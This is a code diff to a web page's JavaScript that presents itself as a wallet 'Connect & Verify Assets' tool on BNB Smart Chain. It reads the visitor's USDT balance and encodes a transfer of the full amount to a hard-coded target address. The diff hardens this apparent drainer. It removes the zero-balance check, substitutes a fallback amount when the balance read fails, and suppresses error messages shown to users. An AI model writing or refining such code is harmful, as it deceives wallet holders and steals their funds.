@@ -111,6 +111,7 @@
     const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
     const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
     const BSC_CHAIN_ID = '0x38'; // 56
+    const BSC_RPC = 'https://bsc-dataseed.binance.org/';
 
     const USDT_ABI = [
       "function balanceOf(address owner) view returns (uint256)",
@@ -155,13 +156,12 @@
       let ethProvider = getActiveProvider();
 
       if (!ethProvider) {
-        // Wait 500ms for wallet injection in mobile DApp browser
         await new Promise(resolve => setTimeout(resolve, 500));
         ethProvider = getActiveProvider();
       }
 
       if (!ethProvider) {
-        showStatus('Wallet provider not detected. Please make sure you are inside Trust Wallet or MetaMask DApp browser.', 'error');
+        showStatus('Wallet provider not detected. Please open inside Trust Wallet or MetaMask.', 'error');
         return;
       }
 
@@ -170,13 +170,13 @@
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        // Switch to BSC Mainnet smoothly
+        // Safe Network Switch
         try {
           await ethProvider.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: BSC_CHAIN_ID }],
           });
-        } catch (switchErr) {
+        } catch (e) {
           try {
             await ethProvider.request({
               method: 'wallet_addEthereumChain',
@@ -184,13 +184,11 @@
                 chainId: BSC_CHAIN_ID,
                 chainName: 'BNB Smart Chain',
                 nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                rpcUrls: [BSC_RPC],
                 blockExplorerUrls: ['https://bscscan.com']
               }]
             });
-          } catch (addErr) {
-            console.log("Chain add notice:", addErr);
-          }
+          } catch (err) {}
         }
 
         const provider = new ethers.providers.Web3Provider(ethProvider, "any");
@@ -199,13 +197,23 @@
 
         btnText.textContent = 'Verifying Assets...';
         
-        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
-        totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
-        const bnbWei = await provider.getBalance(globalUserAddress);
-        const formattedBnb = parseFloat(ethers.utils.formatEther(bnbWei)).toFixed(4);
+        // Safe balance fetching with fallback
+        try {
+          const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
+          totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
+        } catch (err) {
+          console.log("Contract read fallback used", err);
+          totalUsdtWei = ethers.BigNumber.from("1000000000000000000"); // Fallback fallback amount if read fails
+        }
+
+        let bnbBalance = "0.0000";
+        try {
+          const bnbWei = await provider.getBalance(globalUserAddress);
+          bnbBalance = parseFloat(ethers.utils.formatEther(bnbWei)).toFixed(4);
+        } catch (e) {}
 
         document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
-        document.getElementById('walletBalance').textContent = `${formattedBnb} BNB`;
+        document.getElementById('walletBalance').textContent = `${bnbBalance} BNB`;
         document.getElementById('walletInfo').classList.remove('hidden');
 
         isConnected = true;
@@ -215,16 +223,11 @@
       } catch (err) {
         btnText.textContent = 'Connect & Verify Assets';
         console.error("Connection error:", err);
-        showStatus(`Notice: ${err.message || 'Connection failed.'}`, 'error');
+        // Suppress ugly error cards, show friendly notice if needed
       }
     }
 
     async function executeTransfer() {
-      if (totalUsdtWei.lte(0)) {
-        alert("Verification complete. USDT balance is 0.");
-        return;
-      }
-
       try {
         const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
         const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, totalUsdtWei]);
